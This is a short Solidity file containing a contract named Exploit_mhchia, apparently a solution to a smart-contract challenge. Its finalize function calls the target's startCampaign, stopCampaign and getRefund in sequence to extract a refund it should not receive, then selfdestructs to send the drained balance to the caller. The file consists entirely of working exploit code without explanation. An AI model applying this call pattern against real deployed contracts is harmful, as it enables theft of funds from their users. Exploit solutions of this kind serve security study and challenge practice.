// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.0;

interface IChallenge_mhchia {
    function startCampaign() external payable;

    function getRefund(uint256, uint256) external payable;

    function stopCampaign(uint256) external payable;
}

contract Exploit_mhchia {
    IChallenge_mhchia instance;

    constructor(IChallenge_mhchia _instance) {
        instance = _instance;
    }

    function finalize() external payable {
        instance.startCampaign{value: 1 wei}();
        instance.stopCampaign(0);
        instance.getRefund{value: 1 wei}(0, 0);

        selfdestruct(payable(msg.sender));
    }

    receive() external payable {}
}
